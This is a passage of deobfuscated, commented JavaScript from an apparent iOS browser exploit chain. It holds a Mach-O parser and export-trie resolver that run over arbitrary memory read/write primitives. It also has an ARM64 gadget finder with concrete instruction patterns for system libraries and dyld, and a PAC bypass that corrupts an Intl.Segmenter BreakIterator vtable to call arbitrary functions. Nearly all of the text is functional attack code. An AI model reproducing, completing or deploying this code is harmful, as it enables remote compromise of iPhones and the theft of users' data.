    return new nt(l);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// Mach-O parser (class tt / MachOImage, second definition — BigInt-based)
// Parses Mach-O headers directly from memory using BigInt addresses.
// ════════════════════════════════════════════════════════════════════════════

/* Original: MachOImage (second definition, BigInt-based) */
class tt {
  // Resolve an exported symbol name via the export trie
  kl(n) {
    if (null !== this.Cl) {
      const t = this.Cl.Nn(n); // ExportTrieParser.Nn lookup
      return null !== t ? this.al + j(t) : null;
    }
    throw new Error("tt.kl(n) failed");
  }
  // Find a segment by name
  sl(n) {
    const t = this.Al[n];
    return void 0 !== t ? t : null;
  }
  // Create MachOImage by scanning backwards from an address to find the Mach-O header
  static td(n) {
    if (0n === n) throw new Error("0n === n");
    const t = (() => {
      let t = n - n % 0x1000n; // page-align downward
      for (;
      0xFEEDFACF !== platformModule.platformState.exploitPrimitive.read32(t);) t -= 0x1000n;
      return t;
    })();
    return tt.init(t);
  }
  // Parse Mach-O load commands starting from a known header address
  static init(n) {
    const t = platformModule.platformState.exploitPrimitive.read32(n + j(16)), // ncmds
      o = [];
    let c = null, // export trie info
      e = null, // ASLR slide (base - __TEXT vmaddr)
      l = 32; // offset to first load command
    for (let r = 0; r < t; r += 1) {
      const t = platformModule.platformState.exploitPrimitive.read32(n + j(l)), // cmd type
        r = platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(4)); // cmdsize
      switch (t) {
        case 25:{// LC_SEGMENT_64 (0x19)
            const t = Object.create({
              Xe: platformModule.platformState.exploitPrimitive.readString(n + j(l) + j(8), 16), // segname (e.g. "__TEXT")
              cl: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(24)), // vmaddr
              ml: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(32)), // vmsize
              _l: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(40)), // fileoff
              dl: platformModule.platformState.exploitPrimitive.read64(n + j(l) + j(48)), // filesize
              hl: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(56)), // maxprot
              wl: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(60)), // initprot
              flags: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(68)), // flags
              bl: void 0, // rebased vmaddr (filled later)
              yl: (() => {
                const t = platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(64)), // nsects
                  o = new Array(t).fill(null);
                for (const t in o) o[t] = {
                  name: platformModule.platformState.exploitPrimitive.readString(n + j(80 * t) + j(l + 72), 16), // sectname
                  cl: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x20n), // addr
                  ml: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x28n), // size
                  _l: platformModule.platformState.exploitPrimitive.read64(n + j(80 * t) + j(l + 72) + 0x30n), // offset
                  bl: void 0 // rebased addr
                };
                return o;
              })(),
              xl(n) {
                for (const t of this.yl)
                if (t.name === n) return t;
                return null;
              }
            });
            if ("__TEXT" === t.Xe) {// __TEXT segment — compute slide
              if (null !== e) throw new Error("null !== e");
              e = n - t.cl;
            }
            o.push(t);
            break;
          }
        case 0x80000022 /* LC_DYLD_INFO_ONLY */:
        case 0x80000033 /* LC_DYLD_EXPORTS_TRIE */:
          if (null !== c) throw new Error("null !== c");
          c = {
            me: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(6442450978 === t ? 40 : 8)), // export data offset
            size: platformModule.platformState.exploitPrimitive.read32(n + j(l) + j(6442450978 === t ? 44 : 12)) // export data size
          };
      }
      l += r;
    }
    const r = {},
      i = [];
    if (null === e) throw new Error("null === e");
    // Rebase all segments and sections by ASLR slide
    for (const n of o) {
      n.bl = n.cl + e;
      for (const t of n.yl) t.bl = n.cl + e;
      n.Xe.length > 0 ? r[n.Xe] = n : i.push(n);
    }
    return new tt(n, r, i, c);
  }
  constructor(n, t, o, c) {
    this.al = n, // Mach-O header base address (BigInt)
    this.Al = t, // segments by name
    this.Sl = o, // unnamed segments
    this.Cl = (() => {// ExportTrieParser (or null)
      if (null === c) return null;
      const n = t.__LINKEDIT; // __LINKEDIT segment for export data
      if (void 0 === n) return null;
      const o = n.bl + j(c.me) - n._l, // compute export trie address in memory
        e = new Uint32Array(c.size + 3 >> 2);
      for (let n = 0; n < e.length; n++) e[n] = platformModule.platformState.exploitPrimitive.read32(o + j(4 * n));
      return new ExportTrieParser(e.buffer);
    })();
  }
}

// ════════════════════════════════════════════════════════════════════════════
// Export trie parser (class nr / ExportTrieParser and class tr / TrieNodeReader)
// Parses the Mach-O export trie to resolve symbol names to offsets.
// ════════════════════════════════════════════════════════════════════════════

/* Original: ExportTrieParser */
class ExportTrieParser {
  // Look up a symbol name in the export trie; returns offset or null
  Nn(n) {
    const t = new TrieNodeReader(this.Tl); // create a TrieNodeReader over the raw trie data
    let o = "",
      c = !1;
    for (; !c;) {
      c = !0;
      const e = t.El(); // read ULEB128: terminal size
      if (0 !== e && n === o) {
        const n = t.El(); // read export kind/flags
        if (8 !== n && 16 !== n) {
          return t.El(); // read ULEB128: symbol offset from image base
        }
      }
      t.pl(e); // skip terminal info bytes
      const l = t.gl(); // number of child edges
      for (let e = 0; e < l; e += 1) {
        const e = t.Il(0, 4132), // read edge label string (null-terminated)
          l = t.El(); // read ULEB128: child node offset
        if (e.length > 0 && n.startsWith(o + e)) {
          o += e, t.ue(l), c = !1; // follow this edge
          break;
        }
      }
    }
    return null;
  }
  constructor(n) {
    this.Tl = n; // raw trie data (ArrayBuffer)
  }
}
const nr = ExportTrieParser;

/* Original: TrieNodeReader — byte-level reader for export trie traversal */
class TrieNodeReader {
  constructor(n) {
    this.Fl = new Uint8Array(n), // raw bytes view
    this.en = new DataView(n), // DataView for structured reads
    this.Pl = 0; // current read position
  }
  // Advance position by n bytes
  pl(n) {
    this.Pl += n;
  }
  // Seek to absolute position
  ue(n) {
    this.Pl = n;
  }
  // Read a single byte and advance
  gl() {
    const n = this.Fl[this.Pl];
    return this.Pl += 1, n;
  }
  // Read a string until terminator byte `n` (max `t` chars)
  Il(n, t = 256) {
    let o = "";
    for (let c = 0; c < t; c++) {
      const t = this.gl();
      if (t === n) return o;
      o += String.fromCharCode(t);
    }
    throw new Error("TrieNodeReader.Il(n, t) failed");
  }
  // Read ULEB128 encoded integer
  El() {
    let n = 0,
      t = 0;
    for (let o = 0; o < 128; o += 1) {
      const o = this.gl();
      if (n += (127 & o) << t, t += 7, 0 == (128 & o)) return n;
    }
    throw new Error("TrieNodeReader.El() failed");
  }
}
const tr = TrieNodeReader;

// ════════════════════════════════════════════════════════════════════════════
// ARM64 gadget finder (class or / ARM64GadgetFinder)
// Searches Mach-O __TEXT segments for specific ARM64 instruction sequences
// (gadgets) needed to build the PAC bypass call chain.
// ════════════════════════════════════════════════════════════════════════════

/* Original: ARM64GadgetFinder */
class or {
  constructor(n) {
    this.od = n; // ImageList reference for resolving images
  }
  // Find a PAC-signed pointer to a known export in data segments
  // Searches __AUTH, __AUTH_CONST, __DATA, __DATA_DIRTY for a pointer
  // whose stripped value matches the export address
  Ul(n) {
    const t = n.vl.kl(n.Dl); // resolve export name to address
    if (null !== t)
    for (const o of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const c = n.Ll.sl(o);
      if (null !== c)
      for (let n = 0x0n; n < c.ml; n += 0x8n) {
        const o = platformModule.platformState.exploitPrimitive.read64(c.bl + n);
        if (cn(o) === t) return o; // found PAC-signed pointer
      }
    }
    return null;
  }
  // Find a PAC-signed pointer to a gadget matching an instruction pattern
  // in __TEXT, stored in data segments
  Bl(n) {
    const t = n.ol.sl("__TEXT");
    if (null === t) return null;
    const o = n.Ol; // instruction pattern to match
    for (const c of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const e = n.ol.sl(c);
      if (null !== e)
      for (let n = 0x0n; n < e.ml; n += 0x8n) {
        const c = platformModule.platformState.exploitPrimitive.read64(e.bl + n),
          l = cn(c);
        // Check: stripped pointer is in __TEXT and matches the gadget pattern
        if (t.bl <= l && l <= t.bl + t.ml && this.Nl(l, o)) return c;
      }
    }
    return null;
  }
  // Search __TEXT for an instruction sequence matching pattern `t`
  Kl(n, t, o = null) {
    const c = n.sl("__TEXT");
    if (null === c) return null;
    const e = c.bl;
    let l = null !== o ? o - c.bl : 0x0n;
    for (; l < c.ml;) {
      const n = e + l;
      if (this.Nl(n, t, !1)) return n;
      l += 0x4n; // ARM64 instructions are 4 bytes
    }
    return null;
  }
  // Follow branch instructions (B/BL) from an address, collecting targets
  zl(n, t = 64) {
    const o = n,
      c = [];
    let e = 0x0n;
    for (; e < j(t);) {
      const n = o + e,
        t = platformModule.platformState.exploitPrimitive.read32(n);
      // Check for B (0x14xxxxxx) or BL (0x94xxxxxx) instructions
      if (0x14000000n === (0xfc000000n & j(t)) || 0x94000000n === (0xfc000000n & j(t))) {
        const o = 4 * this.Hl(t); // sign-extend the branch offset
        c.push(n + j(o));
      }
      e += 0x4n;
    }
    return c;
  }
  // Search within `o` bytes of address `n` for instruction pattern `t`
  Rl(n, t, o = 64) {
    const c = n;
    let e = 0x0n;
    for (; e < j(o);) {
      const n = c + e;
      if (this.Nl(n, t, !1)) return n;
      e += 0x4n;
    }
    return null;
  }
  // Sign-extend a 26-bit branch immediate (for B/BL offset decoding)
  Hl(n) {
    return n << 6 >> 6;
  }
  // Match an instruction sequence at address `n` against pattern `t`
  // Handles ADRP relaxation (ignores page bits) and LDR offset masking
  // If `o` is true, follows B branches transparently
  Nl(n, t, o = !0) {
    let c = 0;
    const e = [];
    // Build masks: ADRP gets 0x9F00001F (ignore page offset),
    // LDR after ADRP gets 0xFFC003FF, B/BL gets 0xFC000000, else exact match
    for (const n of t) 0x90000000n === (0x9f000000n & j(n)) ? (e.push(0x9f00001fn), c += 1) : c > 0 && 0xf9400000n === (0xffc00000n & j(n)) ? e.push(0xffc003ffn) : 0x14000000n === (0xfc000000n & j(n)) || 0x94000000n === (0xfc000000n & j(n)) ? e.push(0xfc000000n) : e.push(0xffffffffn);
    e.length !== t.length && W(); // assert
    let l = n;
    for (const n in t) {
      const c = platformModule.platformState.exploitPrimitive.read32(l);
      if ((j(t[n]) & j(e[n])) != (j(c) & j(e[n]))) return !1;
      if (!0 === o && 0x14000000n === (0xfc000000n & j(c))) {
        const n = 4 * this.Hl(c);
        l += j(n); // follow B branch
      } else l += 0x4n;
    }
    return !0;
  }
  // Disassemble from address `n` collecting ADRP+LDR pointer references
  // Returns list of addresses loaded via ADRP+LDR pairs until RET
  Ml(n, t = 768) {
    const o = [],
      c = new Array(32).fill(null); // register file for tracking ADRP values
    let e = !1;
    for (let l = 0; l < t; l += 4) {
      const t = n + j(l),
        r = j(platformModule.platformState.exploitPrimitive.read32(t));
      // Check for RETAB (0xD65F0FFF) or RET (0xD65F03C0)
      if (0xd65f0fffn === r || 0xd65f03c0n === r) {
        e = !0;
        break;
      }
      // ADRP instruction: compute page address
      if (0x90000000n === (0x9f000000n & r)) {
        const n = r << 8n >> 13n, // immhi
          o = r >> 29n & 3n, // immlo
          e = 0x1fn & r, // destination register
          l = BigInt.asIntN(32, (n << 2n | o) << 12n); // page offset
        c[e] = t - t % 0x1000n + l;
        // LDR instruction following ADRP: compute final address
      } else if (0xf9400000n === (0xffc00000n & r)) {
        const n = r >> 5n & 0x1fn, // base register
          t = r >> 10n & 0xfffn, // unsigned offset (scaled by 8)
          e = c[n];
        null !== e && (o.push(e + 0x8n * t), c[n] = null);
      }
    }
    if (!e) throw new Error("!e");
    return o;
  }
}

// ════════════════════════════════════════════════════════════════════════════
// Segmenter exploit (const en / SegmenterExploit)
// Core PAC bypass: corrupts Intl.Segmenter iterator's ICU BreakIterator
// vtable to invoke arbitrary PAC-signed function pointers.
// ════════════════════════════════════════════════════════════════════════════

/* Original: SegmenterExploit */
const en = {
  // ── Fa: Find all gadgets needed for PAC bypass ──────────────────
  // Locates PAC signing gadgets in dyld shared cache libraries:
  //   - _xmlSAX2GetPublicId in libxml2 (vtable pointer)
  //   - _dlfcn_globallookup in ActionKit (symbol resolver gadget)
  //   - _autohinter_iterator_end in CoreGraphics (iterator end gadget)
  //   - anonymous::begin in CoreGraphics (begin gadget)
  //   - enet_allocate_packet_payload_default in RESync (call chain gadget)
  //   - CFRunLoopObserverCreateWithHandler in CoreFoundation (PAC signer)
  //   - Locates PAC signing vtable in dyld itself
  Fa(n) {
    const t = n[Symbol.iterator](),
      o = (() => {
        const n = platformModule.platformState.exploitPrimitive.getObjectAddress(t); // addrof(iterator) — get JSC object address
        return platformModule.platformState.exploitPrimitive.read64(n + j(on.ou)); // read inline storage pointer
      })() + j(on.cu), // offset to ICU BreakIterator
      c = platformModule.platformState.exploitPrimitive.read64(o + j(on.Ku)), // read delegate pointer
      e = platformModule.platformState.exploitPrimitive.read64(c + j(on.Hu)), // read vtable pointer
      l = nt.nd(cn(e)), // parse ImageList from stripped vtable ptr
      r = new or(l), // create ARM64GadgetFinder
      // Find PAC-signed pointer to _xmlSAX2GetPublicId in libxml2
      i = r.Ul({
        Dl: "_xmlSAX2GetPublicId", // export name to find
        vl: l.tl("libxml2.2.dylib"), // image containing the export
        Ll: l.tl("libxml2.2.dylib") // image to search for PAC pointer
      });
    if (null === i) throw new Error("null === i");
    window.log(`[PAC] Found _xmlSAX2GetPublicId PAC-signed pointer`);
    let a;
    // ARM64 instruction pattern for _dlfcn_globallookup gadget (ActionKit)
    a = [7868719999, 7142789108, 7130414077, 6727681021, 7147095027, 7826571264, 1384120353, 6778795522, 7314866432, 7147095028, 7148340193, 6793607289, 7147095027, 7148405728, 6778795507, 7148340192, 7134608381, 7126274036, 7891521535];
    // Find PAC-signed pointer to _dlfcn_globallookup gadget
    const s = r.Bl({
      Dl: "_dlfcn_globallookup",
      Ol: a,
      ol: l.tl("/System/Library/PrivateFrameworks/ActionKit.framework/ActionKit", "/System/Library/PrivateFrameworks/ActionKit.framework/Versions/A/ActionKit")
    });
    if (null === s) throw new Error("null === s");
    window.log(`[PAC] Found _dlfcn_globallookup gadget`);
    // Find _autohinter_iterator_end gadget in CoreGraphics
    const u = r.Bl({
      Dl: "_autohinter_iterator_end",
      Ol: [7314866369, 8476692514, 7314866306, 8476689440, 8476694561, 7887325279],
      ol: l.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics")
    });
    if (null === u) throw new Error("null === u");
    window.log(`[PAC] Found _autohinter_iterator_end gadget`);
    // Find anonymous::begin gadget in CoreGraphics
    const d = r.Bl({
      Dl: "'anonymous namespace'::begin(__int64)",
      Ol: [8476697608, 7314866376, 8476690691, 7314866307, 8476689664, 8476694786, 7887325311, 7891518400],
      ol: l.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics")
    });
    if (null === d) throw new Error("null === d");
    window.log(`[PAC] Found anonymous::begin gadget`);
    // Find enet_allocate_packet_payload_default gadget in RESync
    const I = r.Bl({
      Dl: "enet_allocate_packet_payload_default",
      Ol: [7868719999, 7142789108, 7130414077, 6727681021, 7147095027, 7248744520, 8476781832, 7147160544, 7889422623, 7147095028, 7331643520, 7248744520, 8476783880, 7889422623, 8472496756, 7134608381, 7126274036, 7891521535],
      ol: l.tl("/System/Library/PrivateFrameworks/RESync.framework/RESync", "/System/Library/PrivateFrameworks/RESync.framework/Versions/A/RESync")
    });
    if (null === I) throw new Error("null === I");
    window.log(`[PAC] Found enet_allocate_packet_payload_default gadget`);
    // Extract two call targets from enet gadget (branch destinations)
    const m = (() => {
        const n = r.Ml(cn(I), 560);
        if (2 !== n.length) throw new Error("2 !== n.length");
        return {
          ed: n[0], // first ADRP+LDR target
          ld: n[1] // second ADRP+LDR target
        };
      })(),
      // Locate dyld4 internal structures to find the PAC signing vtable
      [y, C] = (() => {
        const n = l.tl("libdyld.dylib").sl("__DATA_DIRTY");
        if (null === n) return null;
        const t = n.xl("__dyld4"); // __dyld4 section in libdyld
        if (null === t) return null;
        const o = platformModule.platformState.exploitPrimitive.read64(t.bl + 8n), // follow pointer chain
          c = platformModule.platformState.exploitPrimitive.read64(cn(o)),
          e = platformModule.platformState.exploitPrimitive.read64(cn(c));
        return [o, tt.td(cn(e))]; // [dyld4 pointer, parsed dyld MachOImage]
      })();
    if (null === C) throw new Error("null === C");
    // Search dyld's __TEXT for the PAC signing vtable
    // The vtable contains pacda/pacia/autia/autda gadgets
    const b = (() => {
      const n = [null],
        // Gadget pattern to identify PAC signing dispatch in dyld
        t = [7868719999, 7142865917, 6727664637, 8476688393, 7364673929, 7842349352, 7841299747, 7842416932, 7147226080, 7147619298, 7126219773, 7868720127, 7685933008, 7364149328, 7855443488];
      let o;
      // Different gadget patterns for iOS >= 16.4 vs older
      for (o = platformModule.platformState.iOSVersion >= 160400 ? [7147095025, 7147619312, 7868719391, 335544332, 7147095025, 7147619312, 7965051409, 335544328, 7147095025, 7147619312, 7868719455, 335544324, 7147095025, 7147619312, 7965052433, 7148209120, 7891518400] : [7314866720, 704840680, 7303347457, 1895825503, 6887112968, 1895828639, 1409286728, 704906224, 8338279967, 6889116176, 6710886417, 6731592241, 7393540656, 268435473, 6628049456, 7887323648, 7965049088, 7891518400, 7965051136, 7891518400, 7965050112, 7891518400, 7965052160, 7891518400]; n.length > 0;) {
        const c = r.Kl(C, t, n.pop());
        if (null === c) continue;
        n.push(c + 0x4n);
        const e = r.zl(c, 4 * t.length + 12);
        for (const n in e)
        if (2 !== e.length) continue;
        if (null !== r.Rl(e[0], o, 256)) return c;
      }
      return null;
    })();
    if (null === b) throw new Error("null === b");
    window.log(`[PAC] Found PAC dispatch gadget in dyld`);
    // Locate the actual PAC operation addresses (pacda/pacia/autia/autda)
    const {
      ua: g, // base address of PAC signing vtable
      ma: h // individual PAC operation addresses
    } = (() => {
      let n, t;
      // Different offsets for iOS >= 16.4 (uses 0x10 spacing vs 0x8)
      platformModule.platformState.iOSVersion >= 160400 ? (t = 0x10n, n = [7147095025, 7147619312, 7868719391, 335544332, 7147095025, 7147619312, 7965051409, 335544328, 7147095025, 7147619312, 7868719455, 335544324, 7147095025, 7147619312, 7965052433, 7148209120, 7891518400]) : (t = 0x8n, n = [7965049088, 7891518400, 7965051136, 7891518400, 7965050112, 7891518400, 7965052160, 7891518400]);
      let o = null;
      const c = (t) => r.Kl(C, n, t);
      if (platformModule.platformState.iOSVersion >= 160400)
      for (;;) {
        if (o = c(o), null === o) return null;
        if (o !== b) break; // skip the first match (it's the dispatch, not the vtable)
        o += j(0x4n * n.length);
      } else o = c(o);
      if (null === o) return null;
      return {
        ua: o - 0x40n, // vtable base (0x40 before the first entry)
        ma: {
          pacda: o, // pacda — sign data pointer
          autia: o + 1n * t, // autia — authenticate instruction pointer
          pacia: o + 2n * t, // pacia — sign instruction pointer
          autda: o + 3n * t // autda — authenticate data pointer
        }
      };
    })();
    if (null === g) throw new Error("null === g");
    if (null === h.pacda) throw new Error("null === h.pacda");
    if (null === h.ha) throw new Error("null === h.ha");
    if (null === h.pacia) throw new Error("null === h.pacia");
    if (null === h.autda) throw new Error("null === h.autda");
    // Find CFRunLoopObserverCreateWithHandler and extract its ADRP+LDR targets
    const p = (() => {
      const n = l.tl("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation").kl("_CFRunLoopObserverCreateWithHandler");
      if (null === n) return null;
      const t = r.Ml(n, 128);
      return 4 !== t.length ? null : {
        rd: n, // function address
        qa: t[1], // pointer slot 1 (overwritten during PAC bypass)
        $a: t[2] // pointer slot 2 (overwritten during PAC bypass)
      };
    })();
    if (null === p) throw new Error("null === p");
    window.log(`[PAC] Located CFRunLoopObserverCreateWithHandler — gadget chain complete`);
    return {
      Ya: { // gadget addresses for vtable corruption
        Ua: i, // _xmlSAX2GetPublicId PAC-signed pointer (vtable entry)
        ja: s, // _dlfcn_globallookup PAC-signed pointer
        ad: null,
        sd: u, // _autohinter_iterator_end PAC-signed pointer
        ud: d, // anonymous::begin PAC-signed pointer
        dd: I // enet_allocate_packet_payload_default PAC-signed pointer
      },
      od: l, // ImageList
      Oa: m, // enet gadget call targets {ed, ld}
      Id: y, // dyld4 pointer
      md: C, // parsed dyld MachOImage
      Ja: p, // CFRunLoopObserverCreateWithHandler info
      yd: b, // PAC dispatch gadget address
      ua: g, // PAC signing vtable base
      Ba: { // PAC operation function pointers
        pacda: h.pacda, // pacda
        autia: h.autia, // autia
        pacia: h.pacia, // pacia
        autda: h.autda // autda
      }
    };
  },
  Cd: null, // cached vtable stub buffer

  // ── va: Invoke a function through corrupted Intl.Segmenter iterator ──
  // This is the core exploit primitive. It:
  //   1. Gets the iterator's internal ICU BreakIterator structure
  //   2. Overwrites the BreakIterator's rule table and vtable with fake data
  //   3. Chains gadgets so that iterator.next() calls the target function `c`
  //      with arguments `e`, `l`, `r`
  //   4. Calls iterator.next() to trigger the corrupted vtable dispatch
  //   5. Reads the return value and restores original state
  va(n, t, o, c, e, l, r) {
    const i = n[Symbol.iterator](),
      a = (() => {
        const n = platformModule.platformState.exploitPrimitive.getObjectAddress(i); // addrof(iterator)
        return platformModule.platformState.exploitPrimitive.read64(n + j(on.ou)); // inline storage pointer
      })(),
      s = a + j(on.cu), // ICU BreakIterator
      u = platformModule.platformState.exploitPrimitive.read64(a + j(on.eu)), // BreakIterator backing store
      d = platformModule.platformState.exploitPrimitive.read64(a + j(on.ru)), // BreakIterator state
      I = platformModule.platformState.exploitPrimitive.read64(a + j(on.lu)), // BreakIterator internal data
      m = platformModule.platformState.exploitPrimitive.read64(s + j(on.Ku)); // delegate pointer (original vtable)
    // Allocate vtable stub buffer (one-time)
    null === en.Cd && (en.Cd = platformModule.platformState.exploitPrimitive.allocZeroBuffer(on.Lu));
    const y = en.Cd,
      C = platformModule.platformState.exploitPrimitive.read64(u + j(on.au)); // rule table address
    {
      // ── Corrupt the rule table ──────────────────────────────
      const n = platformModule.platformState.exploitPrimitive.read32(C + j(on.su)), // row count
        t = platformModule.platformState.exploitPrimitive.read32(C + j(on.uu)), // row size
        o = 2 * (on.Xu + platformModule.platformState.exploitPrimitive.read32(C + j(t))),
        c = on.fu + o * n;
      if (c % 4 != 0) throw new Error("c % 4 != 0");
      // Allocate and copy the rule table
      const [e, l] = platformModule.platformState.exploitPrimitive.allocZeroBufferPair(o);
      for (let n = 0; n < c; n += 4) platformModule.platformState.exploitPrimitive.write32(l + j(n), platformModule.platformState.exploitPrimitive.read32(C + j(n)));
      const r = 2, // flag: word break
        i = 4; // flag: sentence break
      platformModule.platformState.exploitPrimitive.write32(l + j(on.Iu), i | r); // set break flags
      // Zero out all rule rows (force all positions to trigger)
      for (let o = 0; o < n; o++) {
        const n = l + j(on.mu + t * o);
        platformModule.platformState.exploitPrimitive.write32(n, 2);
        for (let o = 0; o < t; o++) platformModule.platformState.exploitPrimitive.patchByte(n + j(on.yu + o), 0);
      }
      // Allocate scratch buffer for call frame
      const [b, g] = platformModule.platformState.exploitPrimitive.allocZeroBufferPair(192);
      platformModule.platformState.exploitPrimitive.write32(l + j(on.du), 48);
      {
        // Fill internal data lookup table with sentinel value (160 = 0xA0)
        const n = I + j(on.Cu);
        for (let t = 0; t < 128; t++) platformModule.platformState.exploitPrimitive.write32(n + j(4 * t), 160);
      }
      // ── Overwrite ICU BreakIterator pointers ────────────────
      platformModule.platformState.exploitPrimitive.write64(u + j(on.au), l), // replace rule table pointer
      platformModule.platformState.exploitPrimitive.write64(a + j(on.iu), g), // replace scratch buffer pointer
      platformModule.platformState.exploitPrimitive.write32(d + j(on.bu), 8589934591 /* 0x1FFFFFFFF — max status value */),
      platformModule.platformState.exploitPrimitive.write32(s + j(on.hu), 160); // set position to 160 (0xA0)
      // Copy vtable stub: redirect virtual dispatch to our gadget chain
      for (let n = 0; n < on.Lu; n += 4) platformModule.platformState.exploitPrimitive.write32(y + j(n), platformModule.platformState.exploitPrimitive.read32(m) + n);
    }
    const b = {
      bd: null, // saved enet gadget target 1
      gd: null // saved enet gadget target 2
    };
    let g;
    // ── Build fake call frames (chained objects) ────────────────
    // These simulate C++ object layouts that the gadgets expect,
    // allowing us to control the arguments passed to the target function.
    const h = { // Frame A layout
        hd: 8, // pointer to next frame
        pd: 32, // function pointer slot
        Kd: 48 // secondary pointer
      },
      p = 56, // Frame A total size
      K = { // Frame B layout
        Ld: 16 // return value slot
      },
      L = 24, // Frame B total size
      X = { // Frame C layout
        hd: 72 // pointer to next frame
      },
      f = 80, // Frame C total size
      _ = { // Frame D layout
        hd: 8, // pointer to arg
        pd: 16, // function pointer
        Xd: 48 // context/extra arg
      },
      M = 56, // Frame D total size
      T = platformModule.platformState.exploitPrimitive.allocZeroBuffer(p), // allocate Frame A1
      x = platformModule.platformState.exploitPrimitive.allocZeroBuffer(p), // allocate Frame A2
      k = platformModule.platformState.exploitPrimitive.allocZeroBuffer(L), // allocate Frame B (return value)
      G = platformModule.platformState.exploitPrimitive.allocZeroBuffer(f), // allocate Frame C
      D = platformModule.platformState.exploitPrimitive.allocZeroBuffer(M), // allocate Frame D
      {
        Ua: w, // _xmlSAX2GetPublicId vtable pointer
        sd: S, // _autohinter_iterator_end gadget
        ud: A, // anonymous::begin gadget
        dd: Z // enet gadget
      } = t;
    // ── Wire up the gadget chain ────────────────────────────────
    // Overwrite vtable dispatch target to point through our chain:
    //   vtable -> S (autohinter_iterator_end) -> A (begin) -> Z (enet) -> target function
    platformModule.platformState.exploitPrimitive.write64(y + j(on.Hu), S), // vtable[dispatch] = autohinter_iterator_end
    platformModule.platformState.exploitPrimitive.write64(s + j(on.Ku), y), // delegate = fake vtable
    platformModule.platformState.exploitPrimitive.write64(s + j(on.gu), T), // fake vtable pointer for position check
    platformModule.platformState.exploitPrimitive.write64(k + j(K.Ld), 0x3333deadn), // sentinel in return slot
    platformModule.platformState.exploitPrimitive.write64(T + j(h.hd), k), // Frame A1 -> Frame B
    platformModule.platformState.exploitPrimitive.write64(T + j(h.Kd), x), // Frame A1 -> Frame A2
    platformModule.platformState.exploitPrimitive.write64(T + j(h.pd), Z), // Frame A1: function = enet gadget
    b.bd = platformModule.platformState.exploitPrimitive.read64(o.ed), // save original enet target 1
    b.gd = platformModule.platformState.exploitPrimitive.read64(o.ld), // save original enet target 2
    platformModule.platformState.exploitPrimitive.write64(o.ed, S), // enet target 1 = autohinter_iterator_end
    platformModule.platformState.exploitPrimitive.write64(o.ld, w), // enet target 2 = vtable pointer
    platformModule.platformState.exploitPrimitive.write64(x + j(h.hd), G), // Frame A2 -> Frame C
    platformModule.platformState.exploitPrimitive.write64(x + j(h.Kd), l), // Frame A2: extra arg = l
    platformModule.platformState.exploitPrimitive.write64(x + j(h.pd), A), // Frame A2: function = begin gadget
    platformModule.platformState.exploitPrimitive.write64(G + j(X.hd), D), // Frame C -> Frame D
    platformModule.platformState.exploitPrimitive.write64(D + j(_.hd), e), // Frame D: arg1 = e
    platformModule.platformState.exploitPrimitive.write64(D + j(_.Xd), r), // Frame D: arg3 = r
    platformModule.platformState.exploitPrimitive.write64(D + j(_.pd), c); // Frame D: function = target function c
    // ── Trigger the corrupted vtable dispatch ───────────────────
    // Calling iterator.next() invokes the BreakIterator's virtual handleNext(),
    // which now dispatches through our gadget chain to call function `c(e, l, r)`.
    try {
      i.next().value;
    } finally {
      // ── Read return value and restore everything ────────────
      g = platformModule.platformState.exploitPrimitive.read64(k + j(K.Ld)), // read return value from Frame B
      platformModule.platformState.exploitPrimitive.write64(o.ed, b.bd), // restore enet target 1
      platformModule.platformState.exploitPrimitive.write64(o.ld, b.gd), // restore enet target 2
      platformModule.platformState.exploitPrimitive.write64(u + j(on.au), C), // restore rule table
      platformModule.platformState.exploitPrimitive.write64(a + j(on.iu), 0x0n), // clear scratch buffer
      platformModule.platformState.exploitPrimitive.write64(s + j(on.Ku), m); // restore original vtable
    }
    return void 0 === g && W(), g; // assert return value is defined
  }
};

// ════════════════════════════════════════════════════════════════════════════
// Module exports
// ════════════════════════════════════════════════════════════════════════════

return r;